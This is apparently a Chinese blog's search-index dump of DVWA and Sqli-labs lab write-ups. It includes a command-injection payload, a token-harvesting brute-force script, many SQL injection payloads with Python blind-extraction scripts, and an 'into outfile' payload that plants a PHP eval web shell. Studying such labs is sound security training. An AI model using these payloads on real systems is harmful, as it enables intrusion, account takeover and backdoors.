&#39;$&#39; =&gt; &#39;&#39;, &#39;(&#39; =&gt; &#39;&#39;, &#39;)&#39; =&gt; &#39;&#39;, &#39;`&#39; =&gt; &#39;&#39;, &#39;||&#39; =&gt; &#39;&#39;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) { // Windows $cmd = shell_exec( &#39;ping &#39; . $target ); } else { // *nix $cmd = shell_exec( &#39;ping -c 4 &#39; . $target ); } // Feedback for the end user $html .= &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt; 对比与Medium难度，High难度进一步对黑名单进行了完善 但是这里注意被过滤的&#39;| &#39;，管道符|后面是有一个空格的，所以这里不加空格的单个|就可以不被过滤 127.0.0.1|net user Command 1 | Command 2 | 是管道符，表示将Command 1的输出作为Command 2的输入，并且只打印Command 2执行的结果。 Security Level — Impossible核心代码 &lt;?php if( isset( $_POST[ &#39;Submit&#39; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // Get input $target = $_REQUEST[ &#39;ip&#39; ]; $target = stripslashes( $target ); // Split the IP into 4 octects $octet = explode( &quot;.&quot;, $target ); // Check IF each octet is an integer if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) { // If all 4 octets are int&#39;s put the IP back together. $target = $octet[0] . &#39;.&#39; . $octet[1] . &#39;.&#39; . $octet[2] . &#39;.&#39; . $octet[3]; // Determine OS and execute the ping command. if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) { // Windows $cmd = shell_exec( &#39;ping &#39; . $target ); } else { // *nix $cmd = shell_exec( &#39;ping -c 4 &#39; . $target ); } // Feedback for the end user $html .= &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } else { // Ops. Let the user name theres a mistake $html .= &#39;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#39;; } } // Generate Anti-CSRF token generateSessionToken(); ?&gt; stripslashes()函数：返回一个去除转义反斜线后的字符串（\\&#39; 转换为 &#39; 等等）。双反斜线（\\\\）被转换为单个反斜线（\\） stripslashes ( string $str ) : string 该难度加入了对Anti-CSRF token的检查，并且获取的$target必须为X.X.X.X的格式，X也只能是数字，因此不存在命令注入漏洞","categories":[],"tags":[{"name":"DVWA","slug":"DVWA","permalink":"https://knlvre.github.io/tags/DVWA/"}],"author":"Knlvre"},{"title":"DVWA 1-Brute Force（暴力破解）","slug":"DVWA 1-Brute Force（暴力破解）","date":"2019-02-09T16:00:00.000Z","updated":"2019-08-18T12:03:41.129Z","comments":true,"path":"2019/02/10/DVWA 1-Brute Force（暴力破解）/","link":"","permalink":"https://knlvre.github.io/2019/02/10/DVWA 1-Brute Force（暴力破解）/","excerpt":"","text":"源码位置DVWA\\vulnerabilities\\brute\\source 页面功能输入用户名密码登录 Security Level — Low核心代码 &lt;?php if( isset( $_GET[ &#39;Login&#39; ] ) ) { // Get username $user = $_GET[ &#39;username&#39; ]; // Get password $pass = $_GET[ &#39;password&#39; ]; $pass = md5( $pass ); // Check the database $query = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) { // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // Login successful $html .= &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; $html .= &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;; } else { // Login failed $html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; mysqli_query()函数：对数据库执行一次查询 mysqli_query ( mysqli $link , string $query [, int $resultmode = MYSQLI_STORE_RESULT ] ) : mixed link：仅以过程化样式：由mysqli_connect() 或 mysqli_init() 返回的链接标识。 query：The query string. Data inside the query should be properly escaped. resultmode：Either the constant MYSQLI_USE_RESULT or MYSQLI_STORE_RESULT depending on the desired behavior. By default, MYSQLI_STORE_RESULT is used. If you use MYSQLI_USE_RESULT all subsequent calls will return error Commands out of sync unless you call mysqli_free_result() With MYSQLI_ASYNC (available with mysqlnd), it is possible to perform query asynchronously. mysqli_poll() is then used to get results from such queries. mysqli_num_rows()函数：返回结果集中行的数目。此命令仅对 SELECT 语句有效。要取得被 INSERT，UPDATE 或者 DELETE 查询所影响到的行的数目，用 mysql_affected_rows()。 mysql_num_rows ( resource $result ) : int mysqli_fetch_assoc()函数：从结果集中取得一行作为关联数组 mysql_fetch_assoc ( resource $result ) : array result：resource 型的结果集。此结果集来自对 mysql_query() 的调用。 本关对用户输入的参数没有任何过滤，直接爆破就可以，首先用Burpsuit抓包并将包发送到Intruder模块 可以通过§符号包裹来标识我们需要爆破的参数。如上图，包发送过来该模块时，Burpsuit自动帮我们选定了几个参数，然而我们并不要怎么多，首先点击一下右边的Clear §清除全部 然后分别选中我们需要参数（即admin和password），点击Add § 点击上面选栏的Payloads，在Payload Options里手动输入，也可以导入字典 现在点击右上角的Start attack就可以开始攻击，在攻击的结果中，可以看到有一个请求Length与其他不同，那么该请求就应该是爆破到了正确的账号密码 Security Level — Medium核心代码 &lt;?php if( isset( $_GET[ &#39;Login&#39; ] ) ) { // Sanitise username input $user = $_GET[ &#39;username&#39; ]; $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitise password input $pass = $_GET[ &#39;password&#39; ]; $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // Check the database $query = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) { // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // Login successful $html .= &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; $html .= &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;; } else { // Login failed sleep( 2 ); $html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; 本关同样对参数没有过滤，可以使用Low等级中的方法爆破 . Security Level — High核心代码 &lt;?php if( isset( $_GET[ &#39;Login&#39; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // Sanitise username input $user = $_GET[ &#39;username&#39; ]; $user = stripslashes( $user ); $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitise password input $pass = $_GET[ &#39;password&#39; ]; $pass = stripslashes( $pass ); $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // Check database $query = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) { // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // Login successful $html .= &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; $html .= &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;; } else { // Login failed sleep( rand( 0, 3 ) ); $html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } // Generate Anti-CSRF token generateSessionToken(); ?&gt; 可以从源码中看出来，本难度通过checkToken()函数对user_token做了一个检查，利用IDEA追踪这个函数，在dvwaPage.inc.php中发现了这个函数 当user_token不等于session_token时，会跳转回index.php，所以本难度登录爆破过程中，我们还需要保证这2个参数的一致。那么想要爆破就必须掌握user_token参数，知道他从哪里产生的，听说有经验的人都知道是php后端产生的，那么我们就回顾一下index.php的源码，发现其中有一个函数checkToken()，当难度等于high或impossible时调用这个函数 同样利用IDEA追踪，在dvwaPage.inc.php中发现了这个函数 看来是拼接到了HTML页面中去了，去浏览器右键查看网页源代码，发现了user_token 发现之后，有两种方法去爆破： 方法①：burpsuit 这次我们需要给user_token也包裹上 此时因为多了一个user_token要设置，所以来到Option的Grep-Extract选项，然后点击Add-Fatch response，就能看到响应的源码 双击选中需要的内容，会自动填充 OK后就可以看到，然后要记得设置跟随重定向（Redirections中选择Always） 现在还不能start attack,因为还没有选择攻击方式，bp一共有四种攻击方式，网上翻就可以翻到，本次攻击选择Cluster bomb方式 再次来到Payload选项，可以看到此时Payload set下拉菜单变成了3个（因为我们选中了3个参数） 3个选项依次对应3个参数，第1跟第2个参数我们直接像之前那样，Payload type选择Simple list，然后填入我们觉得可能的字符 第3个选项，我们需要将Payload type选择为Recursive grep，然后记得把Option里的Number of threads设置为1，因为无法多线程跑 这种方式可能跑不出来 方法②：Python 获取user_token再去提交 from bs4 import BeautifulSoup import requests,re header={&#39;Host&#39;:&#39;127.0.0.1&#39;, &#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0&#39;, &#39;Accept&#39;:&#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;, &#39;Accept-Language&#39;:&#39;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#39;, &#39;Referer&#39;:&#39;http://127.0.0.1/vulnerabilities/brute/&#39;, &#39;cookie&#39;:&#39;PHPSESSID=8p4kb7jc1df431lo6qe249quv2; security=high&#39;, &#39;Connection&#39;:&#39;close&#39;, &#39;Upgrade-Insecure-Requests&#39;:&#39;1&#39; } requrl=&quot;http://127.0.0.1/dvwa/vulnerabilities/brute/&quot; def get_token(requrl,header): response=requests.get(url=requrl,headers=header) print (response.status_code,len(response.content)) soup=BeautifulSoup(response.text,&quot;html.parser&quot;) input=soup.form.select(&quot;input[type=&#39;hidden&#39;]&quot;) #返回的是一个list列表 user_token=input[0][&#39;value&#39;] #获取用户的token return user_token user_token=get_token(requrl,header) i=0 for line in open(&quot;C:/Users/HSW/Desktop/mima.txt&quot;): requrl=&quot;http://127.0.0.1/vulnerabilities/brute/?username=admin&amp;password=&quot;+line.strip()+&quot;&amp;Login=Login&amp;user_token=&quot;+user_token i=i+1 print (i , &#39;admin&#39; ,line.strip(),end=&quot; &quot;) user_token=get_token(requrl,header) if(i==20): break Security Level — Impossible核心代码 &lt;?php if( isset( $_POST[ &#39;Login&#39; ] ) &amp;&amp; isset ($_POST[&#39;username&#39;]) &amp;&amp; isset ($_POST[&#39;password&#39;]) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // Sanitise username input $user = $_POST[ &#39;username&#39; ]; $user = stripslashes( $user ); $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitise password input $pass = $_POST[ &#39;password&#39; ]; $pass = stripslashes( $pass ); $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // Default values $total_failed_login = 3; $lockout_time = 15; $account_locked = false; // Check the database (Check user information) $data = $db-&gt;prepare( &#39;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&#39; ); $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR ); $data-&gt;execute(); $row = $data-&gt;fetch(); // Check to see if the user has been locked out. if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $row[ &#39;failed_login&#39; ] &gt;= $total_failed_login ) ) { // User locked out. Note, using this method would allow for user enumeration! //$html .= &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;; // Calculate when the user would be allowed to login again $last_login = strtotime( $row[ &#39;last_login&#39; ] ); $timeout = $last_login + ($lockout_time * 60); $timenow = time(); /* print &quot;The last login was: &quot; . date (&quot;h:i:s&quot;, $last_login) . &quot;&lt;br /&gt;&quot;; print &quot;The timenow is: &quot; . date (&quot;h:i:s&quot;, $timenow) . &quot;&lt;br /&gt;&quot;; print &quot;The timeout is: &quot; . date (&quot;h:i:s&quot;, $timeout) . &quot;&lt;br /&gt;&quot;; */ // Check to see if enough time has passed, if it hasn&#39;t locked the account if( $timenow &lt; $timeout ) { $account_locked = true; // print &quot;The account is locked&lt;br /&gt;&quot;; } } // Check the database (if username matches the password) $data = $db-&gt;prepare( &#39;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; ); $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR); $data-&gt;bindParam( &#39;:password&#39;, $pass, PDO::PARAM_STR ); $data-&gt;execute(); $row = $data-&gt;fetch(); // If its a valid login... if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $account_locked == false ) ) { // Get users details $avatar = $row[ &#39;avatar&#39; ]; $failed_login = $row[ &#39;failed_login&#39; ]; $last_login = $row[ &#39;last_login&#39; ]; // Login successful $html .= &quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;{$user}&lt;/em&gt;&lt;/p&gt;&quot;; $html .= &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;; // Had the account been locked out since last login? if( $failed_login &gt;= $total_failed_login ) { $html .= &quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;; $html .= &quot;&lt;p&gt;Number of login attempts: &lt;em&gt;{$failed_login}&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;${last_login}&lt;/em&gt;.&lt;/p&gt;&quot;; } // Reset bad login count $data = $db-&gt;prepare( &#39;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#39; ); $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR ); $data-&gt;execute(); } else { // Login failed sleep( rand( 2, 4 ) ); // Give the user some feedback $html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in {$lockout_time} minutes&lt;/em&gt;.&lt;/pre&gt;&quot;; // Update bad login count $data = $db-&gt;prepare( &#39;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#39; ); $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR ); $data-&gt;execute(); } // Set the last login time $data = $db-&gt;prepare( &#39;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&#39; ); $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR ); $data-&gt;execute(); } // Generate Anti-CSRF token generateSessionToken(); ?&gt; 参考文章： https://blog.csdn.net/he_and/article/details/80063315","categories":[],"tags":[{"name":"DVWA","slug":"DVWA","permalink":"https://knlvre.github.io/tags/DVWA/"}],"author":"Knlvre"},{"title":"Sqli-labs(第51-65关)","slug":"Sqli-labs 第51-65关","date":"2019-02-02T16:00:00.000Z","updated":"2019-08-01T15:32:48.470Z","comments":true,"path":"2019/02/03/Sqli-labs 第51-65关/","link":"","permalink":"https://knlvre.github.io/2019/02/03/Sqli-labs 第51-65关/","excerpt":"","text":"前一部分链接：第41-50关Write-up Less-51与前一关相同，单引号包裹，payload ?sort=1&#39;;create table less51 like users--+ Less-52与Less-50相同，只不过没有报错信息回显，payload ?sort=1;create table less51 like users--+ Less-53与Less-51相同，只不过没有报错信息回显，payload ?sort=1&#39;;create table less51 like users--+ Less-54本关开始，又有了新类型的题目了 题目要求注出secret key，并且提交的次数有十次的限制，本关就先一次一次记录一下： ①发现单引号包裹 ?id=2&#39; or 1=1 --+ 回显：Your Login name:Dumb；Your Password:Dumb ②union联合查询成功 ?id=-1&#39; union select 1,2,3 --+ 回显：Your Login name:2;Your Password:3 ③查询表名成功 ?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+ 回显：Your Login name:2;Your Password:c4ukmmeokq ④查询列名成功 ?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;c4ukmmeokq&quot; --+ 回显：Your Login name:2;Your Password:id,sessid,secret_SAT4,tryy ⑤获取密钥 ?id=-1&#39; union select 1,2,secret_SAT4 from c4ukmmeokq --+ 回显：Your Login name:2;Your Password:BlKuhIw2XDbdZWwN6f2W1cTm Less-55与前一关一样，参数用括号包裹，payload #注表名 ?id=-1) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+ #注列名 ?id=-1) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;jzxlk3kxz9&quot; --+ #注密钥 ?id=-1) union select 1,2,secret_NGS3 from jzxlk3kxz9 --+ Less-56与前一关一样，参数用单引号+括号包裹，payload #注表名 ?id=-1&#39;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+ #注列名 ?id=-1&#39;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;0p9yfnr8tk&quot; --+ #注密钥 ?id=-1&#39;) union select 1,2,secret_8QJV from 0p9yfnr8tk --+ Less-57与前一关一样，参数用双引号包裹，payload #注表名 ?id=-1&quot; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+ #注列名 ?id=-1&quot; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;5w2mz645f4&quot; --+ #注密钥 ?id=-1&quot; union select 1,2,secret_HD9O from 5w2mz645f4 --+ Less-58单引号包裹，盲注，python代码只注数据库，不再多谢赘述 from bs4 import BeautifulSoup import requests,re url = &quot;http://127.0.0.1/AAsqli-labs/Less-58/?id=1&#39; and ascii(substr(database(),{},1))={} --+&quot; flag = &quot;&quot; for i in range(1,10): for j in range(95,125): payload = url.format(i,j) r = requests.get(payload) soup = BeautifulSoup(r.text,&#39;lxml&#39;) match = re.findall(&quot;Angelina&quot;,str(soup)) if(match): flag = flag + chr(j) print(flag) Less-59与前一关差不多，只不过没有参数没有包裹，整形注入 Less-60-65类型都差不多，就不再详细讲解了","categories":[],"tags":[{"name":"Sqli-labs","slug":"Sqli-labs","permalink":"https://knlvre.github.io/tags/Sqli-labs/"}],"author":"Knlvre"},{"title":"Sqli-labs(第41-50关)","slug":"Sqli-labs 第41-50关","date":"2019-02-01T16:00:00.000Z","updated":"2019-10-20T08:34:03.964Z","comments":true,"path":"2019/02/02/Sqli-labs 第41-50关/","link":"","permalink":"https://knlvre.github.io/2019/02/02/Sqli-labs 第41-50关/","excerpt":"","text":"前一部分链接：第31-40关Write-up Less-41与Less-39一样，只是没有报错信息，称之为盲注。测试完知道是整形注入，payload ?id=1;insert into users(id,username,password) values(&#39;37&#39;,&#39;users37&#39;,&#39;password37&#39;);--+ Less-42本关通过POST方式提交参数，并且无法创建用户和忘记秘密这两个操作，所以想到应该是结合前面二次注入（存储型注入）+堆叠注入的知识，通过堆叠注入创建一个账号（admin&#39;#），然后再通过这个账号去修改admin的密码，进入后台 动手尝试一下，payload username:1&#39;;insert into users(id,username,password) values(&#39;37&#39;,&#39;users37&#39;,&#39;password37&#39;);--+ password:随意 登录users37时，发现登录不了，试着把注入语句换到password试一下 username:随意 password:1&#39;;insert into users(id,username,password) values(&#39;37&#39;,&#39;users37&#39;,&#39;password37&#39;);--+ 在此登录时发现可以了，之后查看源码发现是username使用mysql_real_escape_string()函数进行了过滤，而password没有过滤。既然可以插入用户，那现在就插入（admin&#39;#），注意这里的单引号要加一个反斜杠才行 username:随意 password:1&#39;;insert into users(id,username,password) values(&#39;38&#39;,&#39;admin\\&#39;#&#39;,&#39;password37&#39;);--+ 可以登录 接下来就是修改密码，先看一下数据库里admin用户的密码 将admin的密码更改为666，然后再次看一下数据库，更改成功 并且可以登录 Less-43通过报错信息可以知道，与前一关不一样的就是，参数通过(&#39;&#39;)包裹，payload username:随意 password:1&#39;);insert into users(id,username,password) values(&#39;38&#39;,&#39;admin\\&#39;#&#39;,&#39;password37&#39;);--+ 其他一样，，不再赘述 Less-44除了没有报错信息之外，这关与Less-42没有区别，payload username:随意 password:1&#39;;insert into users(id,username,password) values(&#39;38&#39;,&#39;admin\\&#39;#&#39;,&#39;password37&#39;);--+ Less-45除了没有报错信息之外，这关与Less-43没有区别，payload username:随意 password:1&#39;);insert into users(id,username,password) values(&#39;38&#39;,&#39;admin\\&#39;#&#39;,&#39;password37&#39;);--+ Less-46本关开始，考查的是order by注入的利用，关于order by注入的知识点可以看我的文章Sqli-labs Tips的Tip 6 本关就用rand()函数进行盲注，先来看一下rand(true)和rand(false)的区别 ?sort=rand(true) ?sort=rand(false) 现在就可以写一个python来爆破 from bs4 import BeautifulSoup import requests,re url = &quot;http://127.0.0.1/AAsqli-labs/Less-46/&quot; #database database_payload = &quot;?sort=rand(ascii(substr({},{},1))={})&quot; for i in range(1,10): for j in range(90,125): array = [] payload = database_payload.format(&quot;database()&quot;,i,j) r = requests.get(url=url+payload) for m in range(0,7,3): soup = re.findall(&quot;&gt;(.*)&lt;&quot;,str(BeautifulSoup(r.text,&quot;lxml&quot;).select(&quot;td&quot;)[m]))[0] array.append(soup) if(array[0]==&quot;11&quot; and array[1]==&quot;5&quot; and array[2]==&quot;4&quot;): database = database + chr(j) break print(&quot;The name of database: &quot; + database) #table database = &quot;security&quot; table_array = [] table_payload = &quot;?sort=rand(ascii(substr((select table_name from information_schema.tables where table_schema=\\&quot;{}\\&quot; limit {},1),{},1))={})&quot; for s in range(5): table_name = &quot;&quot; for i in range(1,10): for j in range(96,125): array = [] payload = table_payload.format(database,s,i,j) r = requests.get(url=url+payload) for m in range(0,7,3): soup = re.findall(&quot;&gt;(.*)&lt;&quot;,str(BeautifulSoup(r.text,&quot;lxml&quot;).select(&quot;td&quot;)[m]))[0] array.append(soup) if(array[0]==&quot;11&quot; and array[1]==&quot;5&quot; and array[2]==&quot;4&quot;): table_name = table_name + chr(j) break table_array.append(table_name) set = 1 for i in table_array: print(&quot;The table of &quot; + database + &quot;: &quot; + str(set) + &quot;.&quot; + str(i) + &quot; &quot;) set = set + 1 等待之后就可以得出结果 Ps：一时兴起，输出写的比较端正，但是出结果很慢，要等待很长时间，需要用时自己再修改一下代码 Less-47本关对sort参数的处理加上了单引号，那么此处就不能直接像之前那样子?sort=rand()，因为如果加上单引号会让函数变成字符串?sort=&#39;rand()&#39;，就不能执行，所以本关必须要闭合掉前面的单引号 这里我们用报错注入 双查询报错注入 #爆数据库 ?sort=1&#39; and (select count(*) from information_schema.columns group by concat(0x3a,(select database()),0x3a,floor(rand(0)*2)))--+ #爆列名 ?sort=1&#39; and (select count(*) from information_schema.columns group by concat(0x3a,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),0x3a,floor(rand(0)*2)))--+ procedure analyse() #爆用户名 ?sort=1&#39; procedure analyse(extractvalue(1,concat(0x3a,user())),1)--+ extractvalue() #爆表名 ?sort=1&#39; and extractvalue(1,concat(0x3a,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x3a))--+ updatexml() #爆列名 ?sort=1&#39; and updatexml(1,concat(0x3a,(select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1),0x3a),1)--+ Less-48本关方法与Less-46一样，唯一区别就是没有报错信息，不再赘述 Less-49本关方法与Less-47一样，唯一区别就是没有报错信息 我们用into outfile来注入试一下 ?sort=1&#39; into outfile &quot;C:\\\\phpstudy\\\\WWW\\\\AAsqli-labs\\\\Less-49\\\\shell.php&quot; lines terminated by 0x3c3f70687020406576616c28245f504f53545b5f5d293b203f3e--+ 可以看到已经把马给写进去了，并且菜刀可以成功连接 Less-50本关开始，考察的是order by注入+堆叠注入，使用mysqli_multi_query()函数，前面关卡已经讲解过，不再赘述 至此，41-50关的Write-up结束 后一部分链接：第51-60关Write-upLess-51","categories":[],"tags":[{"name":"Sqli-labs","slug":"Sqli-labs","permalink":"https://knlvre.github.io/tags/Sqli-labs/"}],"author":"Knlvre"},{"title":"Sqli-labs(第31-40关)","slug":"Sqli-labs 第31-40关","date":"2019-01-31T16:00:00.000Z","updated":"2019-07-31T03:34:59.516Z","comments":true,"path":"2019/02/01/Sqli-labs 第31-40关/","link":"","permalink":"https://knlvre.github.io/2019/02/01/Sqli-labs 第31-40关/","excerpt":"","text":"前一部分链接：第21-30关Write-up Less-31Less-32本关开始，考查的是宽字节注入的利用，关于宽字节注入的知识点可以看我的文章Sqli-labs Tips的Tip 4 我们提交以下payload时，发现单引号&#39;被转义了 ?id=1&#39; 查看源码，发现使用了check_addslashes()函数对id进行了处理 $id=check_addslashes($_GET[&#39;id&#39;]); 看一下这个函数的功能，就是对反斜杠\\、单引号‘、双引号“的过滤 function check_addslashes($string) { $string = preg_replace(&#39;/&#39;. preg_quote(&#39;\\\\&#39;) .&#39;/&#39;, &quot;\\\\\\\\\\\\&quot;, $string); //escape any backslash $string = preg_replace(&#39;/\\&#39;/i&#39;, &#39;\\\\\\&#39;&#39;, $string); //escape single quote with a backslash $string = preg_replace(&#39;/\\&quot;/&#39;, &quot;\\\\\\&quot;&quot;, $string); //escape double quote with a backslash return $string; } 源码中设置mysql使用GBK编码，那这里就可以使用%df来把反斜杠\\给吃掉 mysql_query(&quot;SET NAMES gbk&quot;); payload： ?id=-1%df%27union select 1,2,3 --+ Less-33本关与前一关不一样的是，对id的处理使用了addslashes()函数 addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。 预定义字符是： 单引号（’）双引号（”）反斜杠（\\） 提示：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。 function check_addslashes($string) { $string= addslashes($string); return $string; } 那么这个函数的功能和前一关的函数功能是一样的，所以也可以使用一样的payload： ?id=-1%df%27 union select 1,2,3 --+ Less-34本关的参数改成通过POST方式提交，但是对参数的处理没有变，同样是addslashes()函数 不一样的是，通过输入框传入的参数浏览器不会解码，所以这里不能像之前那样直接填%df%27，直接填经过URL编码过后的：�&#39; 所以用户名填： �&#39; or 1=1 # 密码随意 Less-35本关直接就是整数型注入，参数id没有单引号包裹，刚开始没注意还被搞混了 payload： 